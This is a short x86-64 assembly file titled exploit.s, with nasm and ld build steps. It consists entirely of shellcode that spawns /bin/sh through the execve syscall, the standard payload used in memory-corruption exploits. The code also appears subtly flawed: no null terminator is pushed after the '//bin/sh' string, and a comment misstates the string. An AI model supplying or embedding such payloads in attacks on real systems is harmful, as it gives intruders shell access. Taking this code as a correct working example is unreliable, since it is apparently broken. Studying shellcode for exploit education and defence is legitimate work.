; Filename: exploit.s
; Build:
;   nasm -f elf64 -o exploit.o exploit.s
;   ld -o exploit exploit.o
; Run:
;   ./exploit

BITS 64

section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    xor     rax, rax
    mov     rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push    rbx
    mov     rdi, rsp               ; pointer to "/bin/sh"
    xor     rsi, rsi               ; argv = NULL
    xor     rdx, rdx               ; envp = NULL
    mov     al, 59                 ; syscall number for execve
    syscall
